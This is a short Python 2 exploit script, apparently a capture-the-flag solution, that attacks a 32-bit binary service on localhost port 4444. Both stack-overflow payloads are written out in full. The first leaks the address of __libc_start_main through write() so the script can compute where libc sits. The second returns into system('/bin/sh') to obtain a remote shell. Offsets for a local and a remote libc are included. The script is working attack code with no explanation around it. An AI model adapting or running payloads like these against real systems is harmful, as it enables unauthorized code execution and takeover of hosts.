# -*- coding: utf-8 -*-
from m1z0r3 import *

ip = "localhost"
port = 4444

s,f = sock(ip,port)

write_addr = 0x804830c
main_addr = 0x804841d
libc_start_addr = 0x8049618

# remote libc
# start_main_offset = 0x16bc0
# system_offset = 0x39450
# binsh_offset = 0x1217f3

# local libc
start_main_offset = 0x19990
system_offset = 0x3e800
binsh_offset = 0x15f9e4

# leak libc addr
buf = "A"*140
buf += p32(write_addr)
buf += p32(main_addr)
buf += "\x01\x00\x00\x00"   # handle
buf += p32(libc_start_addr) # addr
buf += "\x04\x00\x00\x00"   # size

s.send(buf)
libc_start_main_addr = u32(s.recv(4))
libc_base_addr = libc_start_main_addr - start_main_offset
system_addr = libc_base_addr + system_offset
binsh_addr = libc_base_addr + binsh_offset

print "[+] libc_start_main_addr %08x" % libc_start_main_addr
print "[+] libc_base_addr %08x" % libc_base_addr
print "[+] system_addr %08x" % system_addr
print "[+] binsh_addr %08x" % binsh_addr

# get shell
buf = "A"*140
buf += p32(system_addr)
buf += p32(main_addr)
buf += p32(binsh_addr)

s.send(buf)

shell(s)
